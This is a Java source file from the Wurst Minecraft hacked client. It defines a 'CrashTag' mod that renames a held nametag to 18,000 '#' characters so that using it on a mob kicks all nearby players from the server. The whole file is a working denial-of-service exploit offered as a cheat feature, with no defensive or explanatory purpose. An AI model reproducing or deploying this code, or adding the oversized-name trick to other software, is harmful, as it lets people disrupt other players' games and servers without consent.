/*
 * Copyright © 2014 - 2018 | Wurst-Imperium | All rights reserved.
 *
 * This Source Code Form is subject to the terms of the Mozilla Public
 * License, v. 2.0. If a copy of the MPL was not distributed with this
 * file, You can obtain one at http://mozilla.org/MPL/2.0/.
 */
package net.wurstclient.features.mods.items;

import net.minecraft.client.gui.inventory.GuiInventory;
import net.minecraft.item.ItemNameTag;
import net.minecraft.item.ItemStack;
import net.wurstclient.compatibility.WMinecraft;
import net.wurstclient.features.Category;
import net.wurstclient.features.Mod;
import net.wurstclient.features.SearchTags;
import net.wurstclient.utils.ChatUtils;

@SearchTags({"CrashNametag", "CrashTag", "crash item", "crash nametag",
	"crash tag"})
@Mod.Bypasses
public final class CrashTagMod extends Mod
{
	public CrashTagMod()
	{
		super("CrashTag",
			"Modifies a nametag so that it can kick people from the server.\n"
				+ "Right click a mob with the modified nametag to kick all nearby players.");
		setCategory(Category.ITEMS);
	}
	
	@Override
	public void onEnable()
	{
		// check gamemode
		if(!WMinecraft.getPlayer().capabilities.isCreativeMode)
		{
			ChatUtils.error("Creative mode only.");
			setEnabled(false);
			return;
		}
		
		// check held item
		ItemStack heldStack = WMinecraft.getPlayer().inventory.getCurrentItem();
		if(heldStack == null || !(heldStack.getItem() instanceof ItemNameTag))
		{
			ChatUtils.error("You need a nametag in your hand.");
			setEnabled(false);
			return;
		}
		
		// modify held item
		StringBuilder stackName = new StringBuilder();
		for(int i = 0; i < 18000; i++)
			stackName.append('#');
		heldStack.setStackDisplayName(stackName.toString());
		
		// open & close the inventory
		// for some reason that's needed for the item to update
		mc.displayGuiScreen(new GuiInventory(WMinecraft.getPlayer()));
		WMinecraft.getPlayer().closeScreen();
		
		ChatUtils.message("Nametag modified.");
		setEnabled(false);
	}
}
